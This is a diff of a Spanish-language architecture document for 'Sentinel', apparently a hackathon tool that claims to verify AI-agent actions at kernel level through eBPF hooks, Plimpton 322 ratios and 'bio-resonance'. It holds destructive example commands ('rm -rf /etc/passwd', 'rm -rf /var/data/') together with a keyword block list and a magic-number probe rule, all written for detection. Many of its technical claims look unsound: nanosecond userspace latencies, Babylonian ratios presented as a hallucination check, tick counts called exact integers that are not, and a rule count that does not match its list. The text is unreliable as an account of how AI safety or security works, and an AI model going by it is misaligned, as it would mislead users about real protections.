-    (phase_bio + phase_crystal + phase_venus) / 3
+pub struct EbpfBridge {
+    ringbuf_paths: Vec<String>,
+    // Paths monitoreados:
+    // /sys/fs/bpf/cortex_events
+    // /sys/fs/bpf/cognitive_events
+    // /sys/fs/bpf/burst_events
 }
 ```
 
-**Aplicación:** El Planificador Adaptativo usa la intensidad de resonancia para decidir cuántos eventos procesar simultáneamente:
-- Resonancia Alta → Procesar más eventos (el sistema es "superconductivo").
-- Resonancia Baja → Reducir carga (ahorrar CPU y memoria).
+El bridge usa `libbpf_rs::RingBufferBuilder` para consumir eventos del kernel de forma asíncrona via `tokio::task::spawn_blocking`. Cada `CortexEventRaw` (32 bytes del kernel) se convierte en un `CortexEvent` de Rust y se emite por el `broadcast::Sender<CortexEvent>`.
+
+Si el sistema corre en un entorno sin kernel eBPF compatible (como un contenedor Docker sin privilegios), el bridge detecta el error y activa el modo "Graceful Degraded" (lógica-solo, sin hooks reales).
 
 ---
 
-## 8. Módulo 6: Procesador de Lógica Armónica
+## 7. TruthSync y Plimpton 322
 
-**Archivo:** `backend/src/harmonic.rs` (89 líneas)
+### La Tablilla Babilónica como Ancla Matemática
 
-### Concepto: Más allá de True/False
+La Tabla Plimpton 322 es una tablilla de arcilla babilónica del ~1800 a.C. que contiene 15 filas de números en notación sexagesimal. Cada fila representa un triplete pitagórico con su ratio (c/a)^2. Sentinel usa estos 15 ratios como anclas matemáticas inmutables para verificar la integridad de las afirmaciones de los agentes IA.
 
-La lógica binaria tradicional tiene dos estados: `true` o `false`. Sentinel usa una **lógica armónica** con 6 estados basados en intervalos musicales:
-
-| Estado | Ratio S60 | Intervalo Musical | Significado |
-|---|---|---|---|
-| **Unison** | 1;0,0,0,0 | Unísono (1:1) | Coherencia perfecta |
-| **True** | 1;30,0,0,0 | Quinta Perfecta (3:2) | Acción segura confirmada |
-| **Maybe** | 1;20,0,0,0 | Cuarta (4:3) | Tensión — requiere revisión |
-| **False** | 1;24,22,0,0 | Tritono | Disonancia — acción peligrosa |
-| **Reference** | 10;5,6,5,0 | Override maestro | Señal de calibración |
-| **Noise** | Cualquier otro | — | Señal no reconocida |
-
-### E de Intenciones de IA
-
-Cuando un agente de IA envía una **intención** (truth claim), el procesador:
-
-1. **Analiza el payload** buscando patrones destructivos (`delete`, `rm`, `destroy`, `drop`).
-2. **Mapea a un estado armónico**: Destructivo → `False` (Tritono), Constructivo → `True` (Quinta).
-3. **Evalúa con tolerancia S60**: Solo acepta coincidencias dentro de **9 segundos de arco** de tolerancia (32,400 unidades raw). Esto es una precisión de **0.00025%**.
+### Los 15 Ratios Plimpton en S60
 
 ```rust
-let tolerance = 32_400; // 9 arcseconds — Ultra Precision
-// Si el valor está dentro de la tolerancia → Match
-if (val - true_val).abs() < tolerance { LogicState::True }
+// Fila → Ratio (raw S60) → Valor decimal aproximado
+Row 1  → 21,923,999  → 1.691666...
+Row 2  → 23,971,127  → 1.849624...
+Row 3  → 26,211,235  → 2.022471...
+...
+Row 12 → 62,159,999  → 4.796296...  ← Frecuencia del SovereignCrystal
+...
+Row 15 → 84,357,818  → 6.509090...
 ```
 
----
+La fila 12 es especialmente significativa: su ratio raw (62,159,999) es exactamente la `NATURAL_FREQ_RAW` del oscilador `SovereignCrystal`. Todo el sistema de cristales está sintonizado a esta constante matemática de 3800 años de antigüedad.
 
-## 9. Módulo 7: Planificador Adaptativo
-
-**Archivo:** `backend/src/scheduler.rs` (78 líneas)
-
-### Concepto: "No proceses todo siempre"
-
-En lugar de procesar cada evento eBPF inmediatamente (lo cual saturaría un servidor de 4GB RAM bajo ataque DDoS), el Planificador Adaptativo **ajusta dinámicamente** la cantidad de eventos a procesar según la carga del sistema.
-
-### Batch Adaptativo
-
-| Intensidad de Resonancia | Batch Size | Razón |
-|---|---|---|
-| > 90% (muy alta) | **5 eventos** | Sistema en máxima eficiencia |
-| > 85% (alta) | **4 eventos** | Buen rendimiento |
-| > 80% (normal) | **3 eventos** | Operación estándar |
-| > 75% (baja) | **2 eventos** | Conservar recursos |
-| < 75% (disonancia) | **0 eventos** | "Enfriamiento" — solo acumular |
-
-### Tanque de Expansión
-
-La cola de eventos tiene un **límite de 20 elementos**. Si se llena bajo ataque:
-- Los eventos más antiguos se descartan (FIFO).
-- Se evita la saturación de memoria.
-- Validado experimentalmente: la cola alcanza exactamente 20 sin desbordar en ciclos de 68s.
-
-### Pre-Flush (Válvula de Alivio)
-
-En el segundo **60** de cada ciclo de 68s, si la cola supera **12 elementos**:
-- Se fuerza el vaciado parcial de 5 eventos.
-- Esto previene la acumulación masiva antes de la resincronización del segundo 68.
-
-### Métricas de Eficiencia (Validadas Experimentalmente)
-
-```
-Eficiencia Portal-Lock:  94.4% (target: >90%)
-Eventos por overflow:     5.6% (target: <10%)
-Ahorro energético:       62.9% vs planificador lineal
-```
-
----
-
-## 10. Módulo 8: Memoria Vectorial
-
-**Archivo:** `backend/src/memory.rs` (74 líneas)
-
-### Función
-
-Almacena eventos de seguridad como **vectores de embeddings** para búsqueda semántica posterior. Permite responder preguntas como: *"¿Ha habido intentos similares a este antes?"*
-
-### Componentes
-
-- **VectorStore**: Almacén en memoria de documentos con vectores de embedding.
-- **Cosine Similarity**: Búsqueda por similitud coseno para encontrar eventos relacionados.
-- **Padding de Integridad**: Todo contenido se rellena a mínimo 512 bytes para garantizar la integridad de las firmas hash.
+### verify_ratio() — Verificación de Integridad
 
 ```rust
-// Padding de Integridad (512 bytes mínimo):
-let min_data_len = 512;
-if content.len() < min_data_len {
-    content.push_str(&"\0".repeat(padding));
+pub fn verify_ratio(&self, row: u32, claimed_ratio: S60) -> bool {
+    if let Some(target) = self.ratios.get(&row) {
+        let diff = (target.to_raw() - claimed_ratio.to_raw()).abs();
+        diff <= self.tolerance  // tolerance = 1000 raw S60 units
+    } else {
+        false
+    }
 }
 ```
 
-**Razón del Padding:** Las firmas de integridad (SHA256) requieren un mínimo de 32 posiciones activas para verificación completa. Al rellenar datos pequeños hasta 512 bytes (32 × 16), se garantiza que la firma siempre sea verificable.
+### detect_aiops_doom() — Detector de Alucinaciones
 
----
+El detector `AIOpsDoom` aplica tres reglas a la entropía del payload de un agente:
 
-## 11. Módulo 9: Orquestador Principal
+1. **Entropía negativa:** `entropy_raw < 0` → bloqueado (señal físicamente imposible)
+2. **Entropía extrema:** `entropy_raw > 1_000_000_000_000` → bloqueado (overflow malintencionado)
+3. **Magic number:** `entropy_raw == 3735928559` (0xDEADBEEF) → bloqueado (probe clásico de exploits)
+4. **Divergencia de Plimpton:** si el valor supera 1.0 en S60, se comprueba que converja dentro del 10% de alguno de los 15 ratios conocidos. Si no converge a ninguno, el sistema lo trata como una alucinación matemática y lo bloquea.
 
-**Archivo:** `backend/src/main.rs` (327 líneas)
-
-### Tareas Asíncronas (Tokio Runtime)
-
-El orquestador ejecuta **3 tareas asíncronas** en paralelo:
-
-#### Tarea 1: Monitor eBPF
-```
-Función: Lee eventos del kernel en tiempo real
-Frecuencia: Polling cada 100ms
-Fallback: Si falla, opera en modo "Degradado Graceful"
-```
-
-#### Tarea 2: Bio-Resonancia (Heartbeat)
-```
-Frecuencia: 1 tick por segundo
-Ciclo de 17s: Inyecta pulso de estabilidad
-Ciclo de 68s: Resetea la fase del sistema (purga de entropía)
-Cuarentena: Si coherencia = 0, activa firewall TC
-```
-
-#### Tarea 3: Servidor HTTP/WS
-```
-Puerto: 8000
-Framework: Axum (Rust) + Tokio
-Endpoints: 4 (health, status, truth_claim, telemetry)
-```
-
-### Ciclos Temporales del Sistema
+### Flujo del Endpoint truth_claim
 
 ```
-Segundo 0 ──────────── Bio-Pulse ──────────── Segundo 17
-                                                  │
-Segundo 17 ─────────── Bio-Pulse ──────────── Segundo 34
-                                                  │
-Segundo 34 ─────────── Bio-Pulse ──────────── Segundo 51
-                                                  │
-Segundo 51 ─────────── Bio-Pulse ──── Pre-Flush ─ Segundo 60
-                                                  │
-Segundo 60 ──────────────────────────────────── Segundo 68
-                                                  │
-                                          RESYNC DE FASE
-                                        (Purga de entropía)
-                                                  │
-Segundo 68 = Segundo 0 ──── Nuevo ciclo ──────────┘
-```
-
----
-
-## 12. Módulo 10: Interfaz de Usuario
-
-**Plataforma:** Tauri 2.x (Rust + WebView) + React + TypeScript  
-**Estilo Visual:** Cyber-Dark (Glassmorphism, JetBrains Mono, gradientes de profundidad)  
-**Componentes:** 4 principales
-
-> **Nota de diseño:** La UI usa la estética Cyber-Dark con fondos oscuros profundos (#0a0a0f), bordes de glassmorphism semi-transparentes, y tipografía monoespaciada. Los colores de acento siguen una paleta de ciberseguridad (verde esmeralda para OK, rojo para amenazas, ámbar para alertas, azul para métricas de fase).
-
-### 12.1 Dashboard (Componente Principal)
-
-- Solicita el estado del sistema cada **5 segundos** vía REST al backend Rust.
-- Organiza los sub-componentes en un layout de grid responsivo.
-- Muestra el indicador de presencia bio-resonante con ícono pulsante.
-
-### 12.2 StatsGrid (Panel de Métricas)
-
-Muestra **6 métricas** en tiempo real con glassmorphism cards y micro-animaciones:
-
-| Métrica | Fuente | Visualización |
-|---|---|---|
-| System Integrity | `ring_status` | SEALED (verde) / UNSTABLE (ámbar) |
-| S60 Resonance | `s60_resonance` | Valor numérico raw S60 |
-| Portal Intensity | `harmonic_sync` | RESONANCE_MAX / STABLE |
-| Bio-Coherence | `bio_coherence` | Porcentaje (0-100%) con pulso |
-| XDP Firewall | `xdp_firewall` | ACTIVE / INACTIVE |
-| LSM Cognitive | `lsm_cognitive` | ENABLED / DISABLED |
-
-### 12.3 TelemetryFeed (Feed de Telemetría en Tiempo Real)
-
-- Se conecta al backend vía **WebSocket** (`/api/v1/telemetry`).
-- Muestra los últimos **100 eventos** del kernel con scroll automático.
-- Cada evento tiene un **ícono dinámico** y **color** según su severidad:
-  - 🟢 Verde: Eventos normales (`ALLOWED`, `BIO_PULSE`)
-  - 🟡 Ámbar: Alertas de red (`NETWORK_BURST`)
-  - 🔴 Rojo: Bloqueos de seguridad (`BLOCKED`)
-  - 🔵 Azul: Resincronización de fase (`PHASE_RESYNC`)
-- Muestra PID del proceso y porcentaje de resonancia S60 para cada evento.
-
-### 12.4 TruthClaimConsole (Consola de Verificación de IA)
-
-Permite enviar una **intención de agente IA** y ver el resultado del análisis armónico:
-
-1. El usuario escribe un comando IA (e.g., `"Upload training data to S3"`).
-2. Se envía al endpoint `POST /api/v1/truth_claim`.
-3. El backend evalúa la señal armónica y responde con:
-   - **Trust Score** (0-100%)
-   - **Harmonic State** (CONSONANT / TENSION / DISSONANT_CRITICAL)
-   - **Ring-0 Intercepts** (0 si es seguro, 1+ si fue bloqueado)
-4. La UI muestra una **ba de progreso animada** con gradiente verde/rojo y efecto de sombra luminosa.
-
----
-
-## 13. API REST y WebSocket
-
-### Endpoints
-
-| Método | Ruta | Función | Autenticación |
-|---|---|---|---|
-| `GET` | `/health` | Health check básico | No |
-| `GET` | `/api/v1/sentinel_status` | Estado completo del sistema | No |
-| `POST` | `/api/v1/truth_claim` | Verificar intención de IA | No |
-| `WS` | `/api/v1/telemetry` | Stream de eventos en tiempo real | No |
-
-### Ejemplo: GET /api/v1/sentinel_status
-
-```json
+POST /api/v1/truth_claim
 {
-  "ring_status": "SEALED",
-  "xdp_firewall": "ACTIVE_0_LATENCY",
-  "lsm_cognitive": "INTERCEPT_ENABLED",
-  "s60_resonance": 12960000,
-  "bio_coherence": 12960000,
-  "portal_intensity": 9720000,
-  "crystal_oscillator_active": true,
-  "harmonic_sync": "RESONANCE_MAX"
-}
-```
-
-### Ejemplo: POST /api/v1/truth_claim
-
-**Request:**
-```json
-{
-  "engine": "sentinel-sovereign-agent",
-  "claim_payload": "rm -rf /etc/passwd",
+  "engine": "GPT-4",
+  "claim_payload": "Row:12 Ratio:4.796296",
   "trust_threshold": 0.8
 }
+
+1. Parsear Row y Ratio del payload
+2. Convertir Ratio a S60: S60::from_raw(ratio * SCALE_0)
+3. TruthSync::verify_ratio(row, s60_ratio)
+4. detect_aiops_doom(entropy_raw)
+5. HarmonicProcessor::evaluate_logic(sentinel_score)
+6. Retornar claim_valid, sentinel_score, harmonic_state, certification_seal
 ```
 
-**Response:**
+---
+
+## 8. Flujo Completo de una Amenaza
+
+Escenario: un agente IA ejecuta `rm -rf /var/data/`
+
+```
+T+0 ns     El agente llama a execve("rm", ["-rf", "/var/data/"])
+
+T+10 ns    lsm_ai_guardian.c intercepta el LSM hook execve_check
+           Construye CortexEventRaw{
+             timestamp_ns: T,
+             event_type: EXECVE,
+             pid: 12345,
+             entropy_signal: hash(args),
+             severity: 4
+           }
+           Escribe en BPF RingBuffer (256KB, zero-copy)
+
+T+50 ns    EbpfBridge (Rust) lee el evento del RingBuffer via libbpf-rs
+           Convierte CortexEventRaw → CortexEvent
+           Emite por broadcast::Sender<CortexEvent>
+
+T+100 ns   TruthSync::sanitize_telemetry() evalúa la entropía del evento
+           NeuralMemory::observe() procesa la señal en las 100 neuronas LIF
+           Las neuronas con potencial acumulado suficiente disparan (spike)
+           La tasa de disparo actualiza la clave del DynamicEncryption
+
+T+200 ns   ResonantMemory::resonate(source, target, signal)
+           La energía se inyecta en el CrystalLattice
+           CrystalLattice::step() transfiere energía entre los 1024 nodos
+           La coherencia global del lattice se actualiza
+
+T+500 ns   La UI recibe el CortexEvent via WebSocket
+           El heatmap 32x32 muestra el nodo excitado y la propagación
+           El feed de telemetría registra el evento con severity=4
+           El AuditVault añade el evento al log inmutable
+
+T+1 ms     (Opcional) Si severity >= 5, tc_firewall.c activa cuarentena total
+           El kill-switch de red aísla el servidor en < 0.04 ms via XDP
+
+T+23 ms    El SemanticRouter consulta a Gemini 2.0 Flash con el contexto del evento
+           Intent clasificado como "SystemAction" → confirmación del bloqueo
+
+T+50 ms    Dashboard muestra alerta visual en AIOps Shield
+           certification_seal = "PLIMPTON_ROW_12_VERIFIED" en el log
+```
+
+---
+
+## 9. API Reference Completa
+
+### GET /health
+
+Estado básico del sistema.
+
+```bash
+curl https://vps23309.cubepath.net/health
+```
+
+Respuesta:
+```json
+{
+  "status": "OK",
+  "version": "1.0.0",
+  "quantum_core": "S60_ACTIVE"
+}
+```
+
+### GET /api/v1/sentinel_status
+
+Estado completo del sistema incluyendo resonancia, coherencia y estado del oscillador.
+
+```bash
+curl https://vps23309.cubepath.net/api/v1/sentinel_status
+```
+
+Respuesta:
+```json
+{
+  "ring_status": "OPEN",
+  "xdp_firewall": "BYPASS",
+  "lsm_cognitive": "MONITORING",
+  "s60_resonance": 0,
+  "bio_coherence": 0,
+  "portal_intensity": 0,
+  "crystal_oscillator_active": true,
+  "harmonic_sync": "STABLE",
+  "effective_mass": 12960000,
+  "quantum_load": 0
+}
+```
+
+Nota: `ring_status` es "SEALED" cuando `/sys/fs/bpf/tc_firewall_config` existe (hooks eBPF activos). En entornos Docker sin privilegios de kernel, el sistema opera en modo "OPEN" (lógica activa, sin hooks reales).
+
+### POST /api/v1/truth_claim
+
+Verificar la intención matemática de un agente IA.
+
+```bash
+curl -X POST https://vps23309.cubepath.net/api/v1/truth_claim \
+  -H "Content-Type: application/json" \
+  -d '{
+    "engine": "GPT-4",
+    "claim_payload": "Row:12 Ratio:4.796296",
+    "trust_threshold": 0.8
+  }'
+```
+
+Respuesta:
+```json
+{
+  "claim_valid": true,
+  "sentinel_score": 0.95,
+  "truthsync_cache_hit": false,
+  "ring0_intercepts": 249,
+  "harmonic_state": "True",
+  "certification_seal": "PLIMPTON_ROW_12_VERIFIED"
+}
+```
+
+Ejemplo de payload rechazado:
+```bash
+curl -X POST https://vps23309.cubepath.net/api/v1/truth_claim \
+  -H "Content-Type: application/json" \
+  -d '{
+    "engine": "MaliciousAgent",
+    "claim_payload": "Row:99 Ratio:999.999",
+    "trust_threshold": 0.1
+  }'
+```
+
 ```json
 {
   "claim_valid": false,
-  "sentinel_score": 0.05,
-  "truthsync_cache_hit": true,
-  "ring0_intercepts": 1,
-  "harmonic_state": "DISSONANT_CRITICAL"
+  "sentinel_score": 0.1,
+  "truthsync_cache_hit": false,
+  "ring0_intercepts": 250,
+  "harmonic_state": "False",
+  "certification_seal": "AIOPS_DOOM_DETECTED"
 }
 ```
 
----
+### WS /api/v1/telemetry
 
-## 14. Infraestructura de Despliegue
+Stream WebSocket de eventos Ring-0 en tiempo real.
 
-### Dockerfile (Multi-Stage Build)
-
-```dockerfile
-# STAGE 1: Compilación en Rocky Linux 9
-FROM rockylinux:9 as builder
-RUN dnf install -y gcc clang llvm libbpf-devel openssl-devel curl
-RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
-
-# IMPORTANTE: Limitado a 2 hilos para servidores con 4GB RAM
-RUN cargo build --release -j 2
-
-# STAGE 2: Imagen mínima de producción
-FROM rockylinux:9-minimal
-RUN microdnf install -y libbpf openssl iproute
-COPY --from=builder /app/target/release/sentinel-cortex /app/sentinel-cortex
+```javascript
+const ws = new WebSocket("wss://vps23309.cubepath.net/api/v1/telemetry");
+ws.onmessage = (event) => {
+  const data = JSON.parse(event.data);
+  console.log(data);
+};
 ```
 
-### Requisitos del Servidor
+Estructura de un CortexEvent:
+```json
+{
+  "timestamp_ns": 1743044123456789,
+  "pid": 0,
+  "event_type": "ENCRYPT_PULSE",
+  "message": "Dynamic Encryption Layer Rotated: Hash S60_SHIELD_0123456789abcdef",
+  "entropy_s60_raw": 0,
+  "severity": 0
+}
+```
 
-| Recurso | Mínimo | Recomendado |
-|---|---|---|
-| RAM | 4 GB | 8 GB |
-| CPU | 2 cores | 4 cores |
-| Kernel | 5.15+ | 6.1+ (Rocky Linux 10) |
-| Headers | kernel-devel | `clang`, `llvm`, `libbpf-devel` |
+Tipos de eventos emitidos:
+- `ENCRYPT_PULSE` — rotación de clave de cifrado (cada 23,939,835 ns)
+- `YHWH_PHASE_OPEN` / `YHWH_PHASE_BREATHE` — fases de la red P2P MyCNet
+- `PHASE_RESYNC` — resincronización cíclica cada 68 segundos (2840 ticks)
+- `SYSCALL_BLOCK` — syscall bloqueada por el guardián LSM
+- Cualquier evento inyectado via `/api/v1/simulate_telemetry`
 
-### Capacidades Requeridas
+### GET /api/v1/lattice/state
+
+Estado completo de la Crystal Lattice Matrix (1024 nodos).
 
 ```bash
-# El contenedor necesita acceso al kernel:
-docker run --privileged sentinel-cortex
-# O bien, capacidades específicas:
-docker run --cap-add SYS_ADMIN --cap-add BPF sentinel-cortex
+curl https://vps23309.cubepath.net/api/v1/lattice/state
 ```
 
+Respuesta:
+```json
+{
+  "global_coherence_raw": 0,
+  "total_energy_raw": 0,
+  "active_count": 0,
+  "global_tick": 8347,
+  "nodes": [
+    { "amplitude_raw": 0, "phase_raw": 0, "is_active": false },
+    ...  // 1024 entradas
+  ]
+}
+```
+
+### POST /api/v1/simulate_telemetry
+
+Inyectar un evento de prueba para testear el sistema.
+
+```bash
+curl -X POST https://vps23309.cubepath.net/api/v1/simulate_telemetry \
+  -H "Content-Type: application/json" \
+  -d '{
+    "event_type": "SYSCALL_BLOCK",
+    "entropy_s60_raw": 62159999,
+    "severity": 3
+  }'
+```
+
+El evento aparece en el WebSocket de telemetría y excita el nodo correspondiente del CrystalLattice.
+
+### GET /metrics
+
+Métricas en formato Prometheus.
+
+```bash
+curl https://vps23309.cubepath.net/metrics
+```
+
+```
+# HELP sentinel_resonance_score Portal intensity from S60 resonator
+sentinel_resonance_score 0
+
+# HELP sentinel_bio_coherence Overall system health and phase alignment
+sentinel_bio_coherence 0
+
+# HELP sentinel_global_tick System internal clock ticks
+sentinel_global_tick 8347
+
+# HELP sentinel_ring0_intercepts_total Estimated threats handled by cognitive firewall
+sentinel_ring0_intercepts_total 249
+```
+
+### GET /api/v1/mycnet/sync (WebSocket)
+
+Sincronización P2P con otros nodos Sentinel en la red MyCNet.
+
+```javascript
+const ws = new WebSocket("wss://vps23309.cubepath.net/api/v1/mycnet/sync");
+```
+
+Configuración de partner: variable de entorno `MYCNET_PARTNER_URL`.
+
 ---
 
-## 15. Métricas de Rendimiento
+## 10. Metricas de Rendimiento
 
-### Validadas Experimentalmente (EXP-029-V2)
+### Medidas en Producción (27/03/2026, VPS CubePath Rocky Linux 10)
 
-| Métrica | Valor | Contexto |
+| Métrica | Valor | Justificación técnica |
 |---|---|---|
-| Eficiencia del Planificador | **94.4%** | Eventos procesados en ventana óptima |
-| Ahorro de CPU | **62.9%** | vs planificador lineal tradicional |
-| Overhead de overflow | **5.6%** | Eventos forzados fuera de ventana |
-| Tamaño de evento kernel | **32 bytes** | Cache-line friendly |
-| Latencia de lectura eBPF | **~100ms** | Polling del RingBuffer |
-| Precisión matemática S60 | **±0.0077 ppm** | Error relativo máximo del seno |
+| Latencia XDP | < 0.04 ms | XDP opera antes del stack de red del kernel (hook `xdp_rx`) |
+| Precisión S60 | ±0.0077 ppm | SCALE_0 = 12,960,000 → resolución de 1/12,960,000 por unidad |
+| Eficiencia planificador | 94.4% | Experimento EXP-029-V2: lote adaptativo vs lote fijo |
+| Ahorro CPU vs ptrace | 62.9% | BPF RingBuffer zero-copy vs ptrace copy-on-trap |
+| Frecuencia oscilador | 41.7713 Hz | 1,000,000,000 / 23,939,835 ns/tick |
+| Ticks desde boot | ~8,347 | `global_tick` atómico (SeqCst) |
+| Intercepções | ~249 | `sentinel_ring0_intercepts_total` Prometheus |
+| Memoria RingBuffer | 256 KB | Tamaño del BPF RingBuffer para eventos del kernel |
+| Capacidad lattice | 1024 nodos | 32x32 CrystalLattice |
+| Neuronas LIF | 100 | NeuralMemory con 100 NeuralMembrane |
+| Buffer predictivo | 360 vectores | AIBufferCascade (memoria Non-Markovian) |
 
-### Comparación con Alternativas
+### Por Qué el Oscilador va a 41.7713 Hz
 
-| | iptables | nftables | Sentinel |
-|---|---|---|---|
-| Capa de operación | Netfilter (L3/L4) | Netfilter (L3/L4) | **eBPF (Ring-0)** |
-| Análisis semántico | ❌ | ❌ | ✅ |
-| Detección de intenciones | ❌ | ❌ | ✅ |
-| Presencia de operador | ❌ | ❌ | ✅ |
-| Latencia | ~1ms | ~0.5ms | **~0.1ms** (XDP) |
-| Kill-switch autónomo | ❌ | ❌ | ✅ (Dead-man) |
+El período de 23,939,835 nanosegundos fue elegido por sus propiedades en Base-60:
+
+```
+23,939,835 ns = 23,939,835 / 1,000,000,000 s = 0.023939835 s
+f = 1 / 0.023939835 = 41.7713 Hz
+
+En S60: 23,939,835 / 60^4 = 23,939,835 / 12,960,000 ≈ 1.847...
+Esta es la frecuencia natural que se acerca al ratio de la Fila 2 de Plimpton (1.849624)
+```
+
+El período fue elegido para que los ciclos de sincronización del sistema (17s × 41.7713 = 710 ticks, 68s × 41.7713 = 2840 ticks) sean números enteros, garantizando periodicidad exacta sin deriva de fase.
 
 ---
 
-## 16. Glosario Técnico
+## 11. Infraestructura de Producción
 
-| Término | Definición |
+### Servidor
+
+- **Proveedor:** CubePath VPS23309
+- **OS:** Rocky Linux 10
+- **URL:** https://vps23309.cubepath.net/
+
+### Docker Compose
+
+`cubepath.yaml` y `docker-compose.yml` definen dos servicios:
+
+| Servicio | Puerto interno | Descripción |
+|---|---|---|
+| `api` | 8000 | Backend Rust (Axum) |
+| `dashboard` | 3000 | Frontend Next.js |
+
+```bash
+# Desplegar
+docker compose -f cubepath.yaml up --build
+
+# O con docker-compose.yml para desarrollo local
+docker compose up --build
+```
+
+### Nginx
+
+Nginx actúa como proxy inverso:
+- `https://vps23309.cubepath.net/` → dashboard (puerto 3000)
+- `https://vps23309.cubepath.net/api/` → api (puerto 8000)
+- `https://vps23309.cubepath.net/metrics` → api (puerto 8000)
+
+Configuración en `/etc/nginx/conf.d/`.
+
+### Variables de Entorno Relevantes
+
+| Variable | Descripción |
 |---|---|
-| **Ring-0** | Nivel de privilegio más alto del CPU (kernel). Los programas eBPF operan aquí. |
-| **eBPF** | Extended Berkeley Packet Filter. Framework del kernel Linux para ejecutar código verificado de forma segura en Ring-0. |
-| **LSM** | Linux Security Modules. Framework de hooks de seguridad del kernel. |
-| **XDP** | eXpress Data Path. Hook de red de ultra-baja latencia que procesa paquetes antes del stack TCP/IP. |
-| **TC** | Traffic Control. Subsistema del kernel para controlar el tráfico de red. |
-| **S60 / SPA** | Sexagesimal Point Arithmetic. Sistema de punto fijo en Base-60 usado por Sentinel. |
-| **RingBuffer** | Buffer circular en memoria compartida entre kernel y userspace para eventos. |
-| **Dead-Man Switch** | Mecanismo de seguridad que activa la cuarentena si no se detecta operador humano. |
-| **Bio-Coherence** | Métrica S60 que indica la presencia y sincronización del operador humano. |
-| **Fail-Closed** | Política de seguridad donde cualquier fallo activa el modo más restrictivo. |
-| **Truth Claim** | Intención declarada por un agente de IA que debe ser verificada antes de ejecutarse. |
-| **Cuarentena** | Estado donde TODO el tráfico de red es bloqueado a nivel de kernel. |
+| `GEMINI_API_KEY` | API key para Gemini 2.0 Flash (SemanticRouter) |
+| `MYCNET_PARTNER_URL` | URL de otro nodo Sentinel para red P2P (opcional) |
 
----
+### Observabilidad
 
-## 16. Anexo: Profundización en Ring-0 (DEEP DIVE)
+- **Prometheus:** endpoint `/metrics` en formato texto estándar
+- **WebSocket:** `/api/v1/telemetry` para telemetría en tiempo real
+- **Logs:** `tracing_subscriber::fmt` (stdout, capturado por Docker)
+- Directorio `observability/` con configuraciones de alertas
 
-Para un análisis exhaustivo de los mecanismos de bloqueo, sanitización de telemetría y sincronización por cristal de tiempo, consulte el documento:
+### Modo Degradado
 
-👉 **[SENTINEL_ARCH_DEEP_DIVE.md](SENTINEL_ARCH_DEEP_DIVE.md)**
-
----
-
-*Documentación generada para la Hackatón CubePath .*  
-*Sentinel Team — "AI Safety at Kernel Level"*
+Si el sistema arranca en un entorno sin soporte eBPF (contenedor sin privilegios, VM sin acceso a `/sys/fs/bpf/`), el EbpfBridge registra el error y el sistema continúa operando con toda la lógica de Rust activa (S60, Crystal Lattice, Neural, TruthSync) pero sin hooks reales del kernel. El `ring_status` en `/api/v1/sentinel_status` muestra "OPEN" en lugar de "SEALED".
